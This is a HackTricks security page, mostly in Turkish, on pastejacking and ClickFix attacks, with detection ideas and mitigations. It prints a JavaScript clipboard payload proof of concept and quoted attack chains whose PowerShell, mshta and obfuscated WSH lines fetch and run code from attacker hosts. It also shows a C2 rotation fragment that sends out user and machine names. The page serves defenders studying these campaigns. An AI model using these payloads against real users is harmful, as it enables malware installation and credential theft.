# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi yapıştırmayın." – eski ama hala geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – diğer adıyla *pastejacking* – kullanıcıların komutları incelemeden kopyala-yapıştır yaptıkları gerçeğinden faydalanır. Kötü niyetli bir web sayfası (veya Electron veya Desktop uygulama gibi herhangi bir JavaScript destekli ortam) saldırgan tarafından kontrol edilen metni programatik olarak sistem panosuna (clipboard) yerleştirir. Kurbanlar genellikle özenle hazırlanmış sosyal mühendislik talimatlarıyla **Win + R** (Çalıştır), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp panodaki içeriği *yapıştırmaya* teşvik edilir; bu da hemen rastgele komutların çalıştırılmasına yol açar.

Çünkü **hiçbir dosya indirilmez ve hiçbir ek açılmaz**, teknik ekleri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içerik güvenlik kontrolünü atlar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware families dağıtan phishing kampanyalarında popülerdir.

## JavaScript Kavram Kanıtı (PoC)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Daha eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`)'ye dayanıyor.

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript, panoya Base64-encoded PowerShell tek satırlık bir komutu sessizce koyan `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
3. HTML talimatları kurbana şunu söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalışır, meşru bir yürütülebilir dosya ile kötü amaçlı bir DLL içeren bir arşiv indirir (klasik DLL sideloading).
5. Loader, ek aşamaları çözer, shellcode enjekte eder ve persistence kurar (ör. scheduled task) — nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll` dosyasını arar.
* Kötü amaçlı DLL API'leri **GetProcAddress** ile dinamik olarak çözer, iki ikili dosyayı (`data_3.bin`, `data_4.bin`) **curl.exe** ile indirir, bunları rolling XOR key `"https://google.com/"` kullanarak çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` konumuna açar.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. MSI payload'ı alır → imzalı bir uygulamanın yanına `libcef.dll` yerleştirir → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer aracılığıyla MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı, `PartyContinued.exe` dosyasını alan, `Boat.pst` (CAB) içeriğini çıkaran, `extrac32` ve dosya birleştirmesi ile `AutoIt3.exe`'yi yeniden oluşturan ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine sızdıran bir gizli PowerShell betiğini başlatır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmeyi tamamen atlar ve kurbanlara WSH aracılığıyla JavaScript çekip çalıştıran, bunu kalıcı hale getiren ve C2'yi günlük olarak döndüren tek satırlık bir komutu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Obfuscated URL çalışma zamanında ters çevrilerek yüzeysel incelemeyi engeller.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kendini kalıcı hale getirir ve C2'yi mevcut güne göre seçer – hızlı domain rotation'a imkan verir.

Tarih ile C2'leri döndürmek için kullanılan minimal JS fragmanı:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sonraki aşama genellikle persistence oluşturan bir loader dağıtarak bir RAT (ör. PureHVNC) çeker; sıklıkla TLS'i hardcoded bir sertifikaya pinler ve trafiği chunk'lar.

Detection ideas specific to this variant
- Proses ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ya da `cscript.exe`).
- Startup artefaktları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içinde WScript/CScript'i `%TEMP%`/`%APPDATA%` altındaki bir JS yoluyla çağıran LNK.
- Registry/RunMRU ve komut satırı telemetrisi içinde `.split('').reverse().join('')` veya `eval(a.responseText)` içeren girdiler.
- Uzun komut satırları olmadan uzun scriptleri vermek için büyük stdin payload'larıyla tekrar eden `powershell -NoProfile -NonInteractive -Command -`.
- Daha sonra LOLBins çalıştıran Scheduled Tasks; örn. updater‑görünümlü bir görev/yol altında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` (örn. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` desenine sahip günlük dönen C2 host adları ve URL'ler.
- Panoya yazma olaylarını Win+R ile yapıştırma ve hemen ardından `powershell.exe` çalışmasıyla korelasyonlayın.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – olağandışı Base64 / gizlenmiş girdilere bakın.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Önlemler

1. Tarayıcı sertleştirme – clipboard yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı hareketi gerektirin.
2. Security awareness – kullanıcılara hassas komutları *type* etmelerini veya önce bir metin düzenleyicisine yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele one-liner'ları engelleyin.
4. Network kontrolleri – bilinen pastejacking ve malware C2 domain'lerine giden outbound istekleri engelleyin.

## İlgili Hileler

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir sunucuya çekip aynı ClickFix yaklaşımını suistimal eder:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Kaynaklar

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
